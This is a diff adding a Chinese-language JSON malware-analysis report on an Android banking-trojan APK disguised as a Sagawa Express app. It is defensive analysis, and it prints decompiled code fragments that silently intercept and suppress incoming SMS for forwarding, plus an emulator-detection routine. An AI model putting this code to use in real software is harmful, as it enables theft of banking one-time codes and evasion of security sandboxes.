@@ -1,0 +1,129 @@
+{
+  "APK信息": {
+    "文件名": "02e25d32a39917bd7c32aabe98bf5f9880fdc8aea4670e85169bf6dc6d6256f4.apk",
+    "sha256": "02e25d32a39917bd7c32aabe98bf5f9880fdc8aea4670e85169bf6dc6d6256f4",
+    "包名": "ss.gao",
+    "应用名": "佐川急便",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 258.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\receiver\\LJ;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.telephony.SmsManager;\nimport android.telephony.SmsMessage;\nimport kk.service.FUK;\nimport kk.service.ShC;\nimport org.json.JSONObject;",
+          "malicious_code_snippet_context": "  import android.content.BroadcastReceiver;\n  import android.content.Context;\n  import android.content.Intent;\n>>> import android.telephony.SmsManager;\n>>> import android.telephony.SmsMessage;\n>>> import java.text.SimpleDateFormat;\n>>> import kk.service.FUK;\n>>> import kk.service.ShC;\n  import kk.util.SPUtil;\n  import kk.util.StUtil;\n  import org.json.JSONException;",
+          "behavior_description": "BroadcastReceiver类LJ引入了SmsManager和SmsMessage，表明该类同时具备接收短信和静默发送短信的能力。在已确认的恶意样本上下文中，该Receiver很可能在收到特定广播（如短信到达、系统启动等）后被触发，解析传入的SmsMessage或JSONObject指令，随后调用SmsManager.sendTextMessage()在用户无感知的情况下发送短信（如向扣费号码发送订阅指令、向C2回传设备信息或拦截的验证码等），构成短信欺诈行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lkk\\receiver\\LJ;",
+          "method_signature": "for(Object pdu : pdus)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\nif (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n    for (Object pdu : pdus) {\n        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n        this.content += smsMessage.getMessageBody();\n        this.sender = smsMessage.getOriginatingAddress();\n        this.time = smsMessage.getTimestampMillis();\n    }\n    this.sp = new SPUtil(context, \"mybank\");\n    abortBroadcast();\n    context.startService(new Intent(context, (Class<?>) FUK.class));\n    Intent in = new Intent(context, (Class<?>) ShC.class);\n    in.putExtra(\"sender\", this.sender);\n    in.putExtra(\"content\", this.content);\n    in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n    context.startService(in);",
+          "malicious_code_snippet_context": "      /* JADX WARN: Type inference failed for: r4v14, types: [kk.receiver.LJ$1] */\n      @Override // android.content.BroadcastReceiver\n      public void onReceive(final Context context, Intent intent) {\n>>>         Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\n>>>         this.content = \"\";\n>>>         if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n>>>             for (Object pdu : pdus) {\n>>>                 SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n>>>                 this.content += smsMessage.getMessageBody();\n>>>                 this.sender = smsMessage.getOriginatingAddress();\n>>>                 this.time = smsMessage.getTimestampMillis();\n>>>             }\n>>>             this.sp = new SPUtil(context, \"mybank\");\n>>>             abortBroadcast();\n>>>             context.startService(new Intent(context, (Class<?>) FUK.class));\n>>>             Intent in = new Intent(context, (Class<?>) ShC.class);\n>>>             in.putExtra(\"sender\", this.sender);\n>>>             in.putExtra(\"content\", this.content);\n>>>             in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n              context.startService(in);\n              new Thread() { // from class: kk.receiver.LJ.1\n                  @Override // java.lang.Thread, java.lang.Runnable",
+          "behavior_description": "该代码注册为SMS_RECEIVED广播接收器，监听所有收到的短信。当短信到达时，从PDU中解析出短信内容(content)、发送方号码(sender)和时间戳(time)，随后调用abortBroadcast()中止广播传播，使系统默认短信应用无法收到该短信，用户完全无感知。拦截到的短信数据通过Intent传递给ShC服务，并在线程中构建JSONObject（疑似上传至C2服务器）。SPUtil使用\"mybank\"作为标识，表明这是一个银行木马，主要目的是拦截银行验证码/OTP和交易确认短信，配合其他模块实现资金窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\util\\JRunCheck;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static String[] known_qemu_drivers = {\"goldfish\"};\npublic boolean isDeviceRooted(Context context) {\n    return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n}\nprivate static Boolean isEmu() {\n    File driver_file = new File(\"/proc/tty/drivers\");\n    if (driver_file.exists() && driver_file.canRead()) {\n        byte[] data = new byte[(int) driver_file.length()];",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class JRunCheck {\n>>>     private static String[] known_qemu_drivers = {\"goldfish\"};\n>>> \n>>>     public boolean isDeviceRooted(Context context) {\n>>>         return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n>>>     }\n>>> \n>>>     private static Boolean isEmu() {\n>>>         File driver_file = new File(\"/proc/tty/drivers\");\n          if (driver_file.exists() && driver_file.canRead()) {\n              byte[] data = new byte[(int) driver_file.length()];\n              try {",
+          "behavior_description": "代码通过读取 /proc/tty/drivers 文件并检查已知 QEMU 驱动特征（如 goldfish）来判断应用是否运行在模拟器环境中，同时结合 root 检测方法综合判断设备状态。这种反模拟器检测技术常被恶意软件用于逃避沙箱分析和安全检测环境，当检测到模拟器时可能改变行为以隐藏恶意逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
